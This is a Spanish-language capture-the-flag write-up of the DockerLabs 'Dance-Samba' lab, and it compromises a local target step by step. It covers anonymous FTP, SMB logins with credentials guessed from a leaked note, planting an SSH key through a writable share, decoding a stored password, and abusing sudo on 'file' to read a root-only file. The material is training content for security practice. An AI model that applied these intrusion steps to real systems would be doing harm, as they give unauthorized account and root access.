---
title: DockerLabs - Dance-Samba
summary: "Write-up del laboratorio Dance-Samba de DockerLabs"
author: elcybercurioso
date: 2025-11-25
categories: [Post, DockerLabs]
tags: [medio, ftp, smb, credentials leaking, ssh login bypass, sudo]
media_subpath: "/assets/img/posts/dockerlabs_dance-samba"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dance-Samba]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG allPorts
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dance-Samba]
└─$ nmap -sCV -p21,22,139,445 172.17.0.2                     
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              69 Aug 19  2024 nota.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:4e:66:7d:e5:2e:cf:df:54:39:b2:08:a9:97:79:21 (ECDSA)
|_  256 92:bf:d3:b8:20:ac:76:08:5b:93:d7:69:ef:e7:59:e1 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4

Host script results:
| smb2-time: 
|   date: 2025-XX-XXTXX:XX:XX
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

## análisis

En la revisión de puertos nos indicaban que podíamos conectarnos al servidor FTP sin proporcionar credenciales, por lo que hacemos eso:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dance-Samba]
└─$ ftp 172.17.0.2          
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:elcybercurioso): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||58163|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              69 Aug 19  2024 nota.txt
226 Directory send OK.
```

Nos descargamos el fichero `nota.txt`, lo abrimos, y vemos que nos dan una pista para averiguar ciertas credenciales de acceso:

```bash
ftp> get nota.txt
local: nota.txt remote: nota.txt
229 Entering Extended Passive Mode (|||6897|)
150 Opening BINARY mode data connection for nota.txt (69 bytes).
100% |*********************************************************************************************************************************************************************|    69      328.69 KiB/s    00:00 ETA
226 Transfer complete.
69 bytes received in 00:00 (41.56 KiB/s)
ftp> exit
221 Goodbye.

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dance-Samba]
└─$ cat nota.txt

I don`t know what to do with Macarena, she`s obsessed with d*****.
```

Dado que la máquina tiene abiertos los puertos 139 y 445, procedemos a revisar el protocolo SMB para obtener más información:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dance-Samba]
└─$ crackmapexec smb 172.17.0.2
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing WINRM protocol database
[*] Initializing RDP protocol database
[*] Initializing SSH protocol database
[*] Initializing SMB protocol database
[*] Initializing FTP protocol database
[*] Initializing MSSQL protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         172.17.0.2      445    CF20362CED29     [*] Windows 6.1 Build 0 (name:CF20362CED29) (domain:CF20362CED29) (signing:False) (SMBv1:False)
```

Con `smbmap` revisamos los recursos disponibles, y los permisos que tenemos sobre los mismos:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dance-Samba]
└─$ smbmap -H 172.17.0.2

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          

[+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        macarena                                                NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (cf20362ced29 server (Samba, Ubuntu))
[*] Closed 1 connections
```

La nota que obtuvimos por FTP nos da la pista de que un usuario válido sería `macarena`, y su contraseña podría ser el nombre que nos indican:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dance-Samba]
└─$ smbmap -u macarena -p d***** -H 172.17.0.2

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          

[+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        macarena                                                READ, WRITE
        IPC$                                                    NO ACCESS       IPC Service (cf20362ced29 server (Samba, Ubuntu))
[*] Closed 1 connections
```

Con `smbclient` nos conectamos, y podemos ver los recursos disponibles, destacando el fichero `user.txt`, el cual se encuentra normalmente en las carpetas personales de los usuarios que logramos vulnerar, por lo que lo descargamos:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dance-Samba]
└─$ smbclient \\\\172.17.0.2\\macarena -U "macarena%d*****" 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  XXX XXX XX XX:XX:XX 2025
  ..                                  D        0  XXX XXX XX XX:XX:XX 2025
  user.txt                            N       33  Mon Aug 19 17:20:25 2024
  .bash_history                       H        5  Mon Aug 19 18:26:02 2024
  .cache                             DH        0  Mon Aug 19 17:40:39 2024
  .profile                            H      807  Mon Aug 19 17:18:51 2024
  .bash_logout                        H      220  Mon Aug 19 17:18:51 2024
  .bashrc                             H     3771  Mon Aug 19 17:18:51 2024

                76798724 blocks of size 1024. 37706408 blocks available
smb: \> get user.txt 
getting file \user.txt of size 33 as user.txt (5.4 KiloBytes/sec) (average 5.4 KiloBytes/sec)
```

Vemos que efectivamente contiene la primera flag:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dance-Samba]
└─$ cat user.txt           
ef65****************************
```

## acceso inicial (macarena)

Dado que tenemos acceso al directorio personal de la usuaria `macarena`, procedemos a generar un par de claves, y subimos al fichero `~/.ssh/authorized_keys` la clave pública generada (`id_rsa.pub`):

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dance-Samba]
└─$ ssh-keygen -f id_rsa -P x -q

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dance-Samba]
└─$ mv id_rsa.pub authorized_keys

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dance-Samba]
└─$ smbclient \\\\172.17.0.2\\macarena -U "macarena%d*****"
Try "help" to get a list of possible commands.
smb: \> mkdir .ssh
smb: \> cd .ssh
smb: \.ssh\> put authorized_keys
putting file authorized_keys as \.ssh\authorized_keys (17.3 kB/s) (average 17.3 kB/s)
smb: \.ssh\> ls
  .                                   D        0  XXX XXX XX XX:XX:XX 2025
  ..                                  D        0  XXX XXX XX XX:XX:XX 2025
  authorized_keys                     A      106  XXX XXX XX XX:XX:XX 2025

                76798724 blocks of size 1024. 37689428 blocks available
```

Una vez realizada la configuración, procedemos a conectarnos, indicando la clave privada que hemos generado antes, y vemos que tenemos acceso sin haber proporcionado la contraseña de la usuaria `macarena`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dance-Samba]
└─$ ssh -i id_rsa macarena@172.17.0.2
Enter passphrase for key 'id_rsa': 
macarena@cf20362ced29:~$ whoami
macarena
macarena@cf20362ced29:~$ hostname -I
172.17.0.2
```

Revisando el sistema, nos encontramos en la carpeta `/opt` el fichero `password.txt`:

```bash
macarena@cf20362ced29:~$ ls -la /opt
total 12
drwxr-xr-x 1 root root 4096 Aug 19  2024 .
drwxr-xr-x 1 root root 4096 XX XX XX:XX ..
-rw------- 1 root root   16 Aug 19  2024 password.txt
macarena@cf20362ced29:~$ ls -la /opt/password.txt 
-rw------- 1 root root 16 Aug 19  2024 /opt/password.txt
```

Dado que no tenemos permiso para leerlo, seguimos revisando el sistema, donde encontramos que en el fichero `/home/secret` hay un fichero que sí podemos leer, el cual contiene un hash:

```bash
macarena@cf20362ced29:~$ ls -la /home/
total 24
drwxr-xr-x 1 root     root     4096 Aug 19  2024 .
drwxr-xr-x 1 root     root     4096 XXX XX XX:XX ..
drwxr-xr-x 2 root     root     4096 Aug 19  2024 ftp
drwxr-x--- 1 macarena macarena 4096 XXX XX XX:XX macarena
drwxr-xr-x 2 root     root     4096 Aug 19  2024 secret
macarena@cf20362ced29:/home$ ls -la secret/
total 16
drwxr-xr-x 2 root root 4096 Aug 19  2024 .
drwxr-xr-x 1 root root 4096 Aug 19  2024 ..
-rw-r--r-- 1 root root   49 Aug 19  2024 hash
macarena@cf20362ced29:/home$ cat secret/hash 
MMZV********************************************
```

Pasándolo por [CyberChef](https://cyberchef.io/) vemos que nos indica que es una cadena codificada en Base64, y el resultado anterior codificado nuevamente en Base32, por lo que nos hace la operación inversa, y nos devuelve la cadena original:

![Desktop View](/20251117141831.webp){: width="972" height="589" .shadow}

Tratamos de loguearnos como la usuaria `macarena` para comprobar si se trata de su contraseña, y vemos que en efecto es así:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dance-Samba]
└─$ ssh macarena@172.17.0.2 
macarena@172.17.0.2`s password: 
macarena@cf20362ced29:~$ whoami
macarena
macarena@cf20362ced29:~$ hostname -I
172.17.0.2
```

## escalada de privilegios (root)

Esto ahora nos permite ver los permisos SUDO que tiene (ya que de lo contrario, no lo podríamos haber hecho), y vemos que podemos ejecutar el binario `/usr/bin/file` con los permisos del usuario `root`:

```bash
macarena@cf20362ced29:/home$ sudo -l
[sudo] password for macarena: 
Matching Defaults entries for macarena on cf20362ced29:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User macarena may run the following commands on cf20362ced29:
    (ALL : ALL) /usr/bin/file
```

En [GTFOBins](https://gtfobins.github.io/gtfobins/file/#sudo) nos indican que este permiso nos da la posibilidad de leer fichero con los permisos del usuario `root` con el siguiente comando:

![Desktop View](/20251117142119.webp){: width="972" height="589" .shadow}

Procedemos a leer el fichero que anteriormente no podíamos leer debido a que carecíamos de los permisos necesarios, y vemos que contiene lo que podría ser la contraseña del usuario `root`:

```bash
macarena@cf20362ced29:/home$ sudo file -f /opt/password.txt 
root:r*********: cannot open `root:r*********' (No such file or directory)
```

Probamos a conectarnos como el usuario `root`, y vemos que efectivamente la contraseña le pertenece:

```bash
macarena@cf20362ced29:/home$ su root
Password: 
root@cf20362ced29:/home# whoami
root
```

En el directorio del usuario `root` encontramos la flag:

```bash
root@cf20362ced29:/home/macarena# ls -la /root
total 32
-rw-r--r-- 1 root root   32 Aug 19  2024 root.txt
-rw-r--r-- 1 root root   33 Aug 19  2024 true_root.txt
root@cf20362ced29:~# cat root.txt 
It`s not that easy, first root.
root@cf20362ced29:~# cat true_root.txt 
efb6****************************
```

Con esto, llegamos al final de la máquina Dance-Samba!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>